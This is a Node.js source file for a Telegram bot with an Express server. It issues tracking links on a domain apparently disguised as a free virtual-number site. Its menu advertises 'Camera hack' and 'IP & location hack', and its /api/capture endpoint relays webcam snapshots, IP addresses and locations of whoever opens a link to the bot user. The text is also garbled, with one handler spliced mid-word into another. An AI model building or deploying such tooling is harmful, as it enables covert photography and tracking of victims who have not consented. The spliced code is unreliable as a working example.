// server.js
const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// Middleware
app.use(bodyParser.json({ limit: "20mb" }));
app.use(express.static(path.join(__dirname, "public")));

// Domain fallback
const DOMAIN = "https://freevirtualnumbers.onrender.com";
const CHANNEL_USERNAME = "@devxtechzone";

// ===== User Tracking =====
const activeUsers = {};
const TOKEN_EXPIRY_MS = 10 * 60 * 1000; // 10 min

setInterval(() => {
  const now = Date.now();
  for (const token in activeUsers) {
    if (now - activeUsers[token].createdAt > TOKEN_EXPIRY_MS) {
      delete activeUsers[token];
    }
  }
}, 2 * 60 * 1000);

function generateToken() {
  return crypto.randomBytes(8).toString("hex");
}

// ===== Bot Menu =====
function mainMenu() {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("🎱 Pool Tracking", "pool"),
      Markup.button.callback("⚡ Normal Tracking", "normal")
    ],
    [
      Markup.button.callback("📊 Bot Stats", "stats"),
      Markup.button.callback("🧠 Info", "info")
    ],
    [Markup.button.callback("👨‍💻 Developer", "dev")],
    [
      Markup.button.url("🌐 Support Channel", "https://t.me/Mrddev"),
      Markup.button.url("🌐 DevX Tech Zone", "https://t.me/devxtechzone")
    ]
  ]);
}

async function isUserJoined(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    return (
      member.status === "creator" ||
      member.status === "administrator" ||
      member.status === "member"
    );
  } catch {
    return false;
  }
}

async function forceJoin(ctx) {
  return ctx.reply(
`🚫 ACCESS LOCKED

You must join our channel to use this bot.

After joining click the button below.`,
{
  parse_mode: "HTML",
  ...Markup.inlineKeyboard([
    [Markup.button.url("📢 Join DevX Tech Zone", "https://t.me/devxtechzone")],
    [Markup.button.callback("✅ I Joined", "check_join")]
  ])
});
}
// ===== Bot Handlers =====


// ===== Pool Mode =====
bot.action("pool", async (ctx) => {
  await ctx.answerCbQuery();
  const token = generateToken();
  activeUsers[token] = { chat_id: ctx.chat.id, username: ctx.from.username, createdAt: Date.now() };

  const msg = await ctx.reply("⚙️ Initializing Pool Mode...");
  await new Promise(r => setTimeout(r, 1500));

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    undefined,
    `
🎱 <b>POOL TRACKING MODE</b>

━━━━━━━━━━━━━━━━━━

🔗 <b>Your Unique Link:</b>
<code>${DOMAIN}?token=${token}</code>

Send this link and monitor interactions.
`,
    { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]]) }
  );
});

// ===== Normal Mode =====
bot.action("normal", async (ctx) => {
  await ctx.answerCbQuery();
  const token = generateToken();
  activeUsers[token] = { chat_id: ctx.chat.id, username: ctx.from.username, createdAt: Date.now() };

  const msg = await ctx.reply("⚙️ Preparing Normal Mode...");
  await new Promise(r => setTimeout(r, 1500));

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    undbot.start(async (ctx) => {

  const joined = await isUserJoined(ctx);

  if (!joined) {
    return forceJoin(ctx);
  }

  await ctx.replyWithPhoto(
    "https://files.catbox.moe/v75lmb.jpeg",
    {
      caption: `
<b>🔱 PRO TRACKER SYSTEM v3.0</b>

━━━━━━━━━━━━━━━━━━
⚡ <b>Status:</b> ONLINE
🤖 <b>Engine:</b> Telegraf Core
🌐 <b>Server:</b> Secure Cloud

Select a module below to begin.

<i>Precision. Speed. Control.</i>
`,
      parse_mode: "HTML",
      ...mainMenu()
    }
  );
});efined,
    `
⚡ <b>NORMAL TRACKING MODE</b>

━━━━━━━━━━━━━━━━━━

🔗 <b>Your Unique Link:</b>
<code>${DOMAIN}?token=${token}</code>

Deploy and observe activity.
`,
    { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]]) }
  );
});

bot.action("check_join", async (ctx) => {

  const joined = await isUserJoined(ctx);

  if (!joined) {
    await ctx.answerCbQuery("❌ Join the channel first", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("✅ Access Granted");

  await ctx.replyWithPhoto(
    "https://files.catbox.moe/v75lmb.jpeg",
    {
      caption: `
<b>🔓 ACCESS UNLOCKED</b>

Welcome to the system.

Select a module below.
`,
      parse_mode: "HTML",
      ...mainMenu()
    }
  );
});

// ===== Stats, Info, Dev, Back =====
bot.action("stats", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
📊 <b>BOT STATISTICS</b>

━━━━━━━━━━━━━━━━━━

👥 Active Users: ${Object.keys(activeUsers).length}
🛰 Server Status: ONLINE
🧠 Version: v3.0
`, { parse_mode: "HTML" });
});

bot.action("info", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
🧠 <b>ABOUT THIS BOT</b>

━━━━━━━━━━━━━━━━━━

Features:
• Camera hack
• IP & location hack
• Secure unique session links (10 min expiry)
`, { parse_mode: "HTML" });
});

bot.action("dev", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
👨‍💻 <b>DEVELOPER</b>

━━━━━━━━━━━━━━━━━━

Name: Mr Dev  
Contact: @Mrddev
`, { parse_mode: "HTML" });
});

bot.action("back", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(
    `<b>🔱 PRO TRACKER SYSTEM v3.0</b>

━━━━━━━━━━━━━━━━━━
Select a module below.

<i>Precision. Speed. Control.</i>`,
    { parse_mode: "HTML", ...mainMenu() }
  );
});

// ===== Serve Frontend =====
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public/index.html"));
});

// ===== API to receive image + IP + location =====
app.post("/api/capture", async (req, res) => {
  try {
    const { image, token, ip, location } = req.body;
    if (!image) return res.status(400).json({ error: "No image provided" });
    if (!token || !activeUsers[token]) return res.status(400).json({ error: "Invalid or expired token" });

    const chat_id = activeUsers[token].chat_id;
    const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");

    await bot.telegram.sendPhoto(chat_id, { source: buffer }, {
      caption: `📸 <b>SNAPSHOT CAPTURED</b>

🌐 <b>IP Address:</b> ${ip}
📍 <b>Location:</b> ${location}

🛰 <b>Tracker:</b> Pro Tracker v3`,
      parse_mode: "HTML"
    });

    res.json({ status: "success", message: "Image + IP + Location sent" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

// ===== Start Server =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// Use long polling for simplicity (no webhook required)
bot.launch().then(() => console.log("Telegram bot running"));
